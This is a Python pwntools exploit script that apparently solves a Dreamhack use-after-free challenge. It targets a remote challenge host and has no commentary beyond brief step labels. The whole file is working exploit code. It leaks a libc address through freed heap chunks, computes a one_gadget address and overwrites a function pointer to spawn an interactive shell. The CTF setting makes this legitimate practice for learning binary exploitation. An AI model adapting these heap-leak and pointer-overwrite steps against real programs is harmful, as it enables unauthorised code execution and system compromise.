# Name: uaf_overwrite.py

from pwn import *

def slog(name,addr): success(f'{name}: {hex(addr)}')

HOST = 'host3.dreamhack.games'
PORT = 16430

p = remote(HOST,PORT)
# p = process('./uaf_overwrite')

# context.log_level = 'debug'

def human(weight, age):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b': ', str(weight).encode())
    p.sendlineafter(b': ', str(age).encode())

def robot(weight):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b': ', str(weight).encode())

def custom(size, data, idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)
    p.sendlineafter(b': ', str(idx).encode())


# [1] UAF to calculate 'libc_base'
dummy, tag = b'AAAA', b'B'
custom(0x410, dummy, -1)
custom(0x410, dummy, 0)
custom(0x410, tag, -1)

offset, one_gadget_offeset = 0x3ebca0, 0x10a41c
offset //= 0x100
offset *= 0x100
offset += u64(tag.ljust(8, b'\x00'))
libc_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) - offset
one_gadget = libc_base + one_gadget_offeset

slog('libc_base', libc_base)
slog('one_gadget', one_gadget)

# [2] UAF to manipulate `robot->fptr` and get shell
human(1, one_gadget)
robot(1)

p.interactive()